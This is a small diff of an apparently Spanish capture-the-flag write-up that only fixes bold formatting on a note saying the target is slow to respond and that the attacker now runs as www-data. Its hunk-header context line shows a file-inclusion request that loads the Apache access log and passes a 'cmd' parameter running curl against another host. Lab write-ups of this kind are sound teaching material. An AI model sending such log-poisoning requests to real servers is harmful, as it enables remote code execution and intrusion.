@@ -229,7 +229,7 @@ http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log&cmd=curl 172
 
 ```
 
-**IMPORTANTE : TARDA UN POCO EN RESPONDER , PACIENCIA.
+**IMPORTANTE : TARDA UN POCO EN RESPONDER , PACIENCIA.**
 
 YA ESTAMOS COMO WWW-DATA.
 
